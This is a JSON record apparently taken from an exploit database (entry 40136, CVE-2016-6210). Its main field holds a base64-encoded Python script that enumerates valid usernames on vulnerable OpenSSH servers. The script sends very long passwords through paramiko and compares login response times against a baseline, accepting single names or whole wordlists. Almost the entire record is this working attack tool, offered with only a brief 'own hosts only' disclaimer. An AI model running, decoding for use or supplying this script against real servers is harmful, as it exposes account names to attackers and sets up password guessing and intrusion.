{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMNCiMgQ1ZFczogICAgICAgICAgICAgICAgICBDVkUtMjAxNi02MjEwIChDcmVkaXRzIGZvciB0aGlzIGdvIHRvIEVkZGllIEhhcmFyaSkNCiMNCiMgQXV0aG9yOiAgICAgICAgICAgICAgICAwX28gLS0gbnVsbF9udWxsDQojICAgICAgICAgICAgICAgICAgICAgICAgbnUxMS5udTExIFthdF0geWFob28uY29tDQojICAgICAgICAgICAgICAgICAgICAgICAgT2gsIGFuZCBpdCBpcyBuLXUtb25lLW9uZS5uLXUtb25lLW9uZSwgbm8gbCdzLi4uDQojICAgICAgICAgICAgICAgICAgICAgICAgV29uZGVyIGhvdyB0aGUgZ3V5cyBhdCBwYWNrZXQgc3Rvcm0gY291bGQgZ2V0IHRoaXMgd3JvbmcgOigNCiMgDQojIERhdGU6ICAgICAgICAgICAgICAgICAgMjAxNi0wNy0xOQ0KIyANCiMgUHVycG9zZTogICAgICAgICAgICAgICBVc2VyIG5hbWUgZW51bWVyYXRpb24gYWdhaW5zdCBTU0ggZGFlbW9ucyBhZmZlY3RlZCBieSBDVkUtMjAxNi02MjEwLiANCiMgDQojIFByZXJlcXVpc2l0ZXM6ICAgICAgICAgTmV0d29yayBhY2Nlc3MgdG8gdGhlIFNTSCBkYWVtb24uDQojDQojIERJU0NMQUlNRVI6ICAgICAgICAgICAgVXNlIGFnYWluc3QgeW91ciBvd24gaG9zdHMgb25seSEgQXR0YWNraW5nIHN0dWZmIHlvdSBhcmUgbm90IA0KIyAgICAgICAgICAgICAgICAgICAgICAgIHBlcm1pdHRlZCB0byBtYXkgcHV0IHlvdSBpbiBiaWcgdHJvdWJsZSENCiMNCiMgQW5kIG5vdyAtIHRoZSBmdW4gcGFydCA6LSkNCiMgDQoNCg0KaW1wb3J0IHBhcmFtaWtvDQppbXBvcnQgdGltZQ0KaW1wb3J0IG51bXB5DQppbXBvcnQgYXJncGFyc2UNCmltcG9ydCBzeXMNCg0KYXJncyA9IE5vbmUNCg0KY2xhc3MgYmNvbG9yczoNCiAgSEVBREVSID0gJ1wwMzNbOTVtJw0KICBPS0JMVUUgPSAnXDAzM1s5NG0nDQogIE9LR1JFRU4gPSAnXDAzM1s5Mm0nDQogIFdBUk5JTkcgPSAnXDAzM1s5M20nDQogIEZBSUwgPSAnXDAzM1s5MW0nDQogIEVOREMgPSAnXDAzM1swbScNCiAgQk9MRCA9ICdcMDMzWzFtJw0KICBVTkRFUkxJTkUgPSAnXDAzM1s0bScNCg0KDQpkZWYgZ2V0X2FyZ3MoKToNCiAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoKQ0KICBncm91cCA9IHBhcnNlci5hZGRfbXV0dWFsbHlfZXhjbHVzaXZlX2dyb3VwKCkNCiAgcGFyc2VyLmFkZF9hcmd1bWVudCgiaG9zdCIsIHR5cGUgPSBzdHIsIGhlbHAgPSAiR2l2ZSBTU0ggc2VydmVyIGFkZHJlc3MgbGlrZSBpcDpwb3J0IG9yIGp1c3QgYnkgaXAiKQ0KICBncm91cC5hZGRfYXJndW1lbnQoIi11IiwgIi0tdXNlciIsIHR5cGUgPSBzdHIsIGhlbHAgPSAiR2l2ZSBhIHNpbmdsZSB1c2VyIG5hbWUiKQ0KICBncm91cC5hZGRfYXJndW1lbnQoIi1VIiwgIi0tdXNlcmxpc3QiLCB0eXBlID0gc3RyLCBoZWxwID0gIkdpdmUgYSBmaWxlIGNvbnRhaW5pbmcgYSBsaXN0IG9mIHVzZXJzIikNCiAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLWUiLCAiLS1lbnVtZXJhdGVkIiwgYWN0aW9uID0gInN0b3JlX3RydWUiLCBoZWxwID0gIk9ubHkgc2hvdyBlbnVtZXJhdGVkIHVzZXJzIikNCiAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLXMiLCAiLS1zaWxlbnQiLCBhY3Rpb24gPSAic3RvcmVfdHJ1ZSIsIGhlbHAgPSAiTGlrZSAtZSwgYnV0IGp1c3QgdGhlIHVzZXIgbmFtZXMgd2lsbCBiZSB3cml0dGVuIHRvIHN0ZG91dCAobm8gYmFubmVyLCBubyBhbnl0aGluZykiKQ0KICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItLWJ5dGVzIiwgZGVmYXVsdCA9IDUwMDAwLCB0eXBlID0gaW50LCBoZWxwID0gIlNlbmQgc28gbWFueSBCWVRFUyB0byB0aGUgU1NIIGRhZW1vbiBhcyBhIHBhc3N3b3JkIikNCiAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLS1zYW1wbGVzIiwgZGVmYXVsdCA9IDEyLCB0eXBlID0gaW50LCBoZWxwID0gIkNvbGxlY3Qgc28gbWFueSBTQU1QTEVTIHRvIGNhbGN1bGF0ZSBhIHRpbWluZyBiYXNlbGluZSBmb3IgYXV0aGVudGljYXRpbmcgbm9uLWV4aXN0aW5nIHVzZXJzIikNCiAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLS1mYWN0b3IiLCBkZWZhdWx0ID0gMy4wLCB0eXBlID0gZmxvYXQsIGhlbHAgPSAiVXNlZCB0byBjb21wdXRlIHRoZSB1cHBlciB0aW1pbmcgYm91bmRhcnkgZm9yIHVzZXIgZW51bWVyYXRpb24iKQ0KICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItLXRyaWFscyIsIGRlZmF1bHQgPSAxLCB0eXBlID0gaW50LCBoZWxwID0gInRyeSB0byBhdXRoZW50aWNhdGUgdXNlciBYIGZvciBUUklBTFMgdGltZXMgYW5kIGNvbXBhcmUgdGhlIG1lYW4gb2YgYXV0aCB0aW1pbmdzIGFnYWluc3QgdGhlIHRpbWluZyBib3VuZGFyeSIpDQogIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpDQogIHJldHVybiBhcmdzDQoNCg0KZGVmIGdldF9iYW5uZXIoaG9zdCwgcG9ydCk6DQogIHNzaCA9IHBhcmFtaWtvLlNTSENsaWVudCgpDQogIHNzaC5zZXRfbWlzc2luZ19ob3N0X2tleV9wb2xpY3kocGFyYW1pa28uQXV0b0FkZFBvbGljeSgpKQ0KICB0cnk6DQogICAgc3NoLmNvbm5lY3QoaG9zdG5hbWUgPSBob3N0LCBwb3J0ID0gcG9ydCwgdXNlcm5hbWUgPSAnaW52YWxpZGludmFsaWRpbnZhbGlkJywgcGFzc3dvcmQgPSAnaW52YWxpZGludmFsaWRpbnZhbGlkJykNCiAgZXhjZXB0Og0KICAgIGJhbm5lciA9IHNzaC5nZXRfdHJhbnNwb3J0KCkucmVtb3RlX3ZlcnNpb24NCiAgICBzc2guY2xvc2UoKQ0KICAgIHJldHVybiBiYW5uZXINCg0KDQpkZWYgY29ubmVjdChob3N0LCBwb3J0LCB1c2VyKToNCiAgZ2xvYmFsIGFyZ3MNCiAgc3RhcnR0aW1lID0gMC4wDQogIGVuZHRpbWUgPSAwLjANCiAgcCA9ICdCJyAqIGludChhcmdzLmJ5dGVzKQ0KICBzc2ggPSBwYXJhbWlrby5TU0hDbGllbnQoKQ0KICBzc2guc2V0X21pc3NpbmdfaG9zdF9rZXlfcG9saWN5KHBhcmFtaWtvLkF1dG9BZGRQb2xpY3koKSkNCiAgc3RhcnR0aW1lPXRpbWUuY2xvY2soKQ0KICB0cnk6DQogICAgc3NoLmNvbm5lY3QoaG9zdG5hbWUgPSBob3N0LCBwb3J0ID0gcG9ydCwgdXNlcm5hbWUgPSB1c2VyLCBwYXNzd29yZCA9IHAsIGxvb2tfZm9yX2tleXMgPSBGYWxzZSwgZ3NzX2F1dGggPSBGYWxzZSwgZ3NzX2tleCA9IEZhbHNlLCBnc3NfZGVsZWdfY3JlZHMgPSBGYWxzZSwgZ3NzX2hvc3QgPSBOb25lLCBhbGxvd19hZ2VudCA9IEZhbHNlKQ0KICBleGNlcHQ6DQogICAgZW5kdGltZT10aW1lLmNsb2NrKCkNCiAgZmluYWxseToNCiAgICBzc2guY2xvc2UoKQ0KICAgIHJldHVybiBlbmR0aW1lIC0gc3RhcnR0aW1lDQoNCg0KDQpkZWYgbWFpbigpOg0KICBnbG9iYWwgYXJncw0KICBhcmdzID0gZ2V0X2FyZ3MoKQ0KICBpZiBub3QgYXJncy5zaWxlbnQ6IHByaW50KCJcblxuVXNlciBuYW1lIGVudW1lcmF0aW9uIGFnYWluc3QgU1NIIGRhZW1vbnMgYWZmZWN0ZWQgYnkgQ1ZFLTIwMTYtNjIxMCIpDQogIGlmIG5vdCBhcmdzLnNpbGVudDogcHJpbnQoIkNyZWF0ZWQgYW5kIGNvZGVkIGJ5IDBfbyAobnUxMS5udTExIFthdF0geWFob28uY29tKSwgUG9DIGJ5IEVkZGllIEhhcmFyaVxuXG4iKQ0KICBpZiBhcmdzLmhvc3Q6DQogICAgaG9zdCA9IGFyZ3MuaG9zdC5zcGxpdCgiOiIpWzBdDQogICAgdHJ5Og0KICAgICAgcG9ydCA9IGludChhcmdzLmhvc3Quc3BsaXQoIjoiKVsxXSkNCiAgICBleGNlcHQgSW5kZXhFcnJvcjoNCiAgICAgIHBvcnQgPSAyMg0KICB1c2VycyA9IFtdDQogIGlmIGFyZ3MudXNlcjoNCiAgICB1c2Vycy5hcHBlbmQoYXJncy51c2VyKQ0KICBlbGlmIGFyZ3MudXNlcmxpc3Q6DQogICAgd2l0aCBvcGVuKGFyZ3MudXNlcmxpc3QsICJyIikgYXMgZjoNCiAgICAgIHVzZXJzID0gZi5yZWFkbGluZXMoKQ0KICBlbHNlOg0KICAgIGlmIG5vdCBhcmdzLnNpbGVudDogcHJpbnQoYmNvbG9ycy5GQUlMICsgIlshXSAiICsgYmNvbG9ycy5FTkRDICsgIllvdSBtdXN0IGdpdmUgYSB1c2VyIG9yIGEgbGlzdCBvZiB1c2VycyIpDQogICAgc3lzLmV4aXQoKQ0KICBpZiBub3QgYXJncy5zaWxlbnQ6IHByaW50KGJjb2xvcnMuT0tCTFVFICsgIlsqXSAiICsgYmNvbG9ycy5FTkRDICsgIlRlc3RpbmcgU1NIRCBhdDogIiArIGJjb2xvcnMuQk9MRCArIHN0cihob3N0KSArICI6IiArIHN0cihwb3J0KSArIGJjb2xvcnMuRU5EQyArICAiLCBCYW5uZXI6ICIgKyBiY29sb3JzLkJPTEQgKyBnZXRfYmFubmVyKGhvc3QsIHBvcnQpICsgYmNvbG9ycy5FTkRDKQ0KICAjIGdldCBiYXNlbGluZSB0aW1pbmcgZm9yIG5vbi1leGlzdGluZyB1c2Vycy4uLg0KICBiYXNlbGluZV9zYW1wbGVzID0gW10NCiAgYmFzZWxpbmVfbWVhbiA9IDAuMA0KICBiYXNlbGluZV9kZXZpYXRpb24gPSAwLjANCiAgaWYgbm90IGFyZ3Muc2lsZW50OiBzeXMuc3Rkb3V0LndyaXRlKGJjb2xvcnMuT0tCTFVFICsgIlsqXSAiICsgYmNvbG9ycy5FTkRDICsgIkdldHRpbmcgYmFzZWxpbmUgdGltaW5nIGZvciBhdXRoZW50aWNhdGluZyBub24tZXhpc3RpbmcgdXNlcnMiKQ0KICBmb3IgaSBpbiByYW5nZSgxLCBpbnQoYXJncy5zYW1wbGVzKSArIDEpOg0KICAgIGlmIG5vdCBhcmdzLnNpbGVudDogc3lzLnN0ZG91dC53cml0ZSgnLicpDQogICAgaWYgbm90IGFyZ3Muc2lsZW50OiBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBzYW1wbGUgPSBjb25uZWN0KGhvc3QsIHBvcnQsICdmb29iYXItYmxlaC1ub25zZW5zZScgKyBzdHIoaSkpDQogICAgYmFzZWxpbmVfc2FtcGxlcy5hcHBlbmQoc2FtcGxlKQ0KICBpZiBub3QgYXJncy5zaWxlbnQ6IHN5cy5zdGRvdXQud3JpdGUoJ1xuJykNCiAgIyByZW1vdmUgdGhlIGJpZ2dlc3QgYW5kIHNtYWxsZXN0IHZhbHVlDQogIGJhc2VsaW5lX3NhbXBsZXMuc29ydCgpDQogIGJhc2VsaW5lX3NhbXBsZXMucG9wKCkNCiAgYmFzZWxpbmVfc2FtcGxlcy5yZXZlcnNlKCkNCiAgYmFzZWxpbmVfc2FtcGxlcy5wb3AoKQ0KICAjIGRvIG1hdGgNCiAgYmFzZWxpbmVfbWVhbiA9IG51bXB5Lm1lYW4obnVtcHkuYXJyYXkoYmFzZWxpbmVfc2FtcGxlcykpDQogIGJhc2VsaW5lX2RldmlhdGlvbiA9IG51bXB5LnN0ZChudW1weS5hcnJheShiYXNlbGluZV9zYW1wbGVzKSkNCiAgaWYgbm90IGFyZ3Muc2lsZW50OiBwcmludChiY29sb3JzLk9LQkxVRSArICJbKl0gIiArIGJjb2xvcnMuRU5EQyArICJCYXNlbGluZSBtZWFuIGZvciBob3N0ICIgKyBob3N0ICsgIiBpcyAiICsgc3RyKGJhc2VsaW5lX21lYW4pICsgIiBzZWNvbmRzLiIpDQogIGlmIG5vdCBhcmdzLnNpbGVudDogcHJpbnQoYmNvbG9ycy5PS0JMVUUgKyAiWypdICIgKyBiY29sb3JzLkVOREMgKyAiQmFzZWxpbmUgdmFyaWF0aW9uIGZvciBob3N0ICIgKyBob3N0ICsgIiBpcyAiICsgc3RyKGJhc2VsaW5lX2RldmlhdGlvbikgKyAiIHNlY29uZHMuIikNCiAgdXBwZXIgPSBiYXNlbGluZV9tZWFuICsgZmxvYXQoYXJncy5mYWN0b3IpICogYmFzZWxpbmVfZGV2aWF0aW9uDQogIGlmIG5vdCBhcmdzLnNpbGVudDogcHJpbnQoYmNvbG9ycy5XQVJOSU5HICsgIlsqXSAiICsgYmNvbG9ycy5FTkRDICsgIkRlZmluaW5nIHRpbWluZyBvZiB4IDwgIiArIHN0cih1cHBlcikgKyAiIGFzIG5vbi1leGlzdGluZyB1c2VyLiIpDQogIGlmIG5vdCBhcmdzLnNpbGVudDogcHJpbnQoYmNvbG9ycy5PS0JMVUUgKyAiWypdICIgKyBiY29sb3JzLkVOREMgKyAiVGVzdGluZyB5b3VyIHVzZXJzLi4uIikNCiAgIyANCiAgIyBHZXQgdGltaW5nIGZvciB0aGUgZ2l2ZW4gdXNlciBuYW1lLi4uDQogICMNCiAgZm9yIHUgaW4gdXNlcnM6DQogICAgdXNlciA9IHUuc3RyaXAoKQ0KICAgIGVudW1fc2FtcGxlcyA9IFtdDQogICAgZW51bV9tZWFuID0gMC4wDQogICAgZm9yIHQgaW4gcmFuZ2UoMCwgaW50KGFyZ3MudHJpYWxzKSk6DQogICAgICB0aW1ldmFsID0gY29ubmVjdChob3N0LCBwb3J0LCB1c2VyKQ0KICAgICAgZW51bV9zYW1wbGVzLmFwcGVuZCh0aW1ldmFsKQ0KICAgIGVudW1fbWVhbiA9IG51bXB5Lm1lYW4obnVtcHkuYXJyYXkoZW51bV9zYW1wbGVzKSkNCiAgICBpZiAoZW51bV9tZWFuIDwgdXBwZXIpOg0KICAgICAgaWYgbm90IChhcmdzLmVudW1lcmF0ZWQgb3IgYXJncy5zaWxlbnQpIDogDQogICAgICAgIHByaW50KGJjb2xvcnMuRkFJTCArICJbLV0gIiArIGJjb2xvcnMuRU5EQyArIHVzZXIgKyAiIC0gdGltaW5nOiAiICsgc3RyKGVudW1fbWVhbikpDQogICAgZWxzZToNCiAgICAgIGlmIG5vdCBhcmdzLnNpbGVudDogDQogICAgICAgIHByaW50KGJjb2xvcnMuT0tHUkVFTiArICJbK10gIiArIGJjb2xvcnMuRU5EQyArIHVzZXIgKyAiIC0gdGltaW5nOiAiICsgc3RyKGVudW1fbWVhbikpDQogICAgICBlbHNlOiANCiAgICAgICAgcHJpbnQodXNlcikNCg0KDQoNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgbWFpbigp", 
    "filename": "platforms/linux/remote/40136.py", 
    "id": "40136", 
    "cves": [
        "CVE-2016-6210"
    ]
}